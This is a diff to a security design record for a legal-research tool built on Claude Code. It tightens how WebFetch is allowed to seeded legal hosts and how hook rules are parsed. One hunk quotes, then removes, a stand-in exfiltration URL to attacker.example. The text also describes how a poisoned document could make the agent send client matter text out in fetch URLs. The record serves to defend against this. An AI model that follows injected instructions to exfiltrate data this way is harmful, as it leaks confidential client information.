@@ -232,8 +232,10 @@ whose policy turns it off counts no relative shell write), the pre-write guard's
   - While it is on, `allowedTools` gains `WebSearch` (not on Bedrock) and one
     `WebFetch(domain:<host>)` per host of `WEB_FETCH_SITES` in `host/src/browser/seed_sites.rs`:
     `SEED_SITES` (R21's copy of the hosts S27 names; S27 adds the High Courts), then
-    `FETCH_ONLY_SITES`. There is no bare `WebFetch` allow, and a hook's bare `WebFetch` or
-    `WebFetch` rule holding `*` is dropped ("Claude's web fetches" below).
+    `FETCH_ONLY_SITES`. There is no bare `WebFetch` allow. A hook's `WebFetch` rule stays only
+    as `WebFetch(domain:<host>)` with a plain lower-case host, and a hook entry with a comma or
+    whitespace outside parentheses, or unbalanced parentheses, is dropped ("Claude's web
+    fetches" below).
   - `additionalDirectories` gains the work folder and the matter's notes folder, after the
     hook's entries.
   - `settings` gains `disableSkillShellExecution: true`, and `skipWebFetchPreflight: true` when
@@ -1398,7 +1400,14 @@ this record and firm-it §8.
   runs in the Claude process, outside the Bash sandbox and outside Clauseo's guard hook, and
   Anthropic's `domain_info` preflight (first-party login only; `skipWebFetchPreflight` turns it
   off on a cloud login) sends only the host name. A poisoned document could have Claude fetch
-  `https://attacker.example/?d=<matter text>` unasked. That rule is gone.
+  any host with matter text in the URL, unasked. That rule is gone.
+  - **The hook's rules.** Claude Code splits `--allowedTools` on commas and whitespace outside
+    parentheses and trims each piece, and reads `WebFetch()` and `WebFetch(*)` as the bare
+    tool. So a hook `WebFetch…` rule stays only if it is `WebFetch(domain:<host>)` with the
+    host in `[a-z0-9.-]`, and any hook entry (any tool) with a comma or whitespace outside
+    parentheses, or unbalanced parentheses, is dropped (`is_one_rule` and `is_open_fetch_rule`
+    in `host/src/agent/loads/profile.rs`). This covers the hook's rules only, not other
+    settings sources: managed settings can allow anything by design.
   - **What is true now.** A fetch from a seeded host (`WEB_FETCH_SITES`) runs unasked in every
     mode but forced ask. A fetch from any other host goes to the session's permission mode: in
     `auto`, Anthropic's auto-mode check judges it, with no card; in an ask mode (`acceptEdits`,
@@ -1421,8 +1430,18 @@ this record and firm-it §8.
     Legislative Department and its statute dashboard, Parliament, PRS and the Law Commission, the e-Gazette, the
     regulators the legal instructions name (TRAI added, and RBI's document host), and the
     tribunals (NCLT, NCLAT, ITAT, NGT, CESTAT, DRT, SAT, APTEL, TDSAT, CAT, NCDRC). The legal
-    instructions name no foreign source, so none is seeded. A seeded host's own operator sees
-    what a fetch sends it; none of them is a site an attacker can read the logs of.
+    instructions name no foreign source, so none is seeded. None of them is a site an attacker
+    can read the logs of.
+  - **Scope.** Text the agent puts in a URL to a seeded site reaches that site's operator (up to
+    2,000 characters per fetch, any number of fetches); this layer limits where fetches go, not
+    what they carry. It covers `WebFetch` only: on macOS today the sandboxed shell reaches
+    every host without asking (`allowedDomains: ["*"]` with auto-allow, "Claude's sandbox
+    (macOS)" above); the shell's reach is the subject of the shell-network change, decided for
+    launch on 16 Nov: a strict allowlist in auto mode, plus the Windows belt in the shell scan.
+    Claude Code also
+    fetches its own short list of developer-documentation hosts without asking ("Preapproved
+    host", about 100 hosts such as docs.python.org); Clauseo doesn't set
+    `CLAUDE_CODE_EVAL_CONFINED`.
   - The subagents' `tools` list (`RESEARCHER_WEB_TOOLS`) names `WebFetch` as a tool the
     researcher may use, not a permission; its fetches meet the same rules.
 
